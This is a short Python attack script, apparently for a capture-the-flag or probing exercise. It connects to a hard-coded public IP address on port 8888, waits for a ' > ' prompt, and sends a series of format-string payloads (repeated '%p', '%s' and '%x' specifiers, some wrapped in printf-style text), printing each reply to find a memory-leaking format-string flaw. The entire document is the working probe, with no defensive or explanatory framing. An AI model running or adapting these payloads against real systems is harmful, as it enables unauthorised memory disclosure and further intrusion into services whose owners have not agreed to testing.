import socket
import time

def send_prompt(prompt):
    s = socket.create_connection(('18.215.143.250', 8888), timeout=15)
    data = b''
    while b' > ' not in data:
        data += s.recv(1024)
    s.sendall(prompt.encode() + b'\n')
    data = b''
    while True:
        try:
            chunk = s.recv(1024)
            if not chunk: break
            data += chunk
            if b' > ' in data: break
        except Exception:
            break
    s.close()
    return data.decode(errors='replace')

prompts = [
    "%p %p %p %p %p %p %p %p %p %p %p %p",
    'printf("%p %p %p %p %p %p %p %p %p %p',
    'printf("%s %s %s %s %s %s %s %s',
    'char* fmt = "%p %p %p %p %p %p %p',
    'Format string vulnerability payload: %p %p %p',
    'echo %x %x %x %x %x %x %x %x %x %x %x',
]

for p in prompts:
    print(f"\n================ Testing: {p} ================")
    res = send_prompt(p)
    print(res)
